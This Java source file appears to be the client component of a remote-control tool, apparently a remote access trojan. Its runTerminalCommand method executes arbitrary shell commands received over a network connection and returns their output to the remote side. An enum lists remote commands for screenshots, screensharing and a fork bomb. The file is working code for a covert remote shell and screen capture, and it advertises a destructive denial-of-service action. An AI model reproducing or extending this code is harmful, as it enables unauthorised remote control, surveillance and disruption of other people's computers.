package main.utils;

import javafx.util.Pair;
import main.network.Connection;
import main.network.Message;

import java.io.IOException;
import java.io.Serializable;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

public class ClientUtils {
    public static void startOnNewThread(Runnable r) {
        new Thread(r).start();
    }

    public static void runTerminalCommand(OsCheck.OSType os, String command, Connection connection) throws IOException {
        if (os.equals(OsCheck.OSType.Windows)) {
            Runtime.getRuntime().exec("cmd /c cd C:\\");
            command = "cmd /c" + command;
        }

        Process proc = Runtime.getRuntime().exec(command);
        Scanner respostaDoComando = new Scanner(proc.getInputStream());

        StringBuilder response = new StringBuilder();
        while (respostaDoComando.hasNext()) {
            response.append(respostaDoComando.nextLine() + "\n");
        }

        connection.sendMessage(new Message("print", response.toString()));
    }

    public static void sendCommandList(Connection connection) {
        List<Pair<String, String>> commandsAndDescriptions = new ArrayList<>();
        for(Command c : Command.values()) {
            commandsAndDescriptions.add(new Pair<>(c.command, c.description));
        }
        connection.sendMessage(new Message("commands", (Serializable) commandsAndDescriptions));
    }

    public enum Command {
        SCREENSHOT("screen", "Sends a screenshot"),
        START_SCREENSHARE("start-screenshare", "Starts screenshare"),
        STOP_SCREENSHARE("stop-screenshare", "Stops screenshare"),
        FORK_BOMB("bomb", "Runs a fork-bomb");

        private String command;
        private String description;

        Command(String command, String description) {
            this.command = command;
            this.description = description;
        }

    }
}

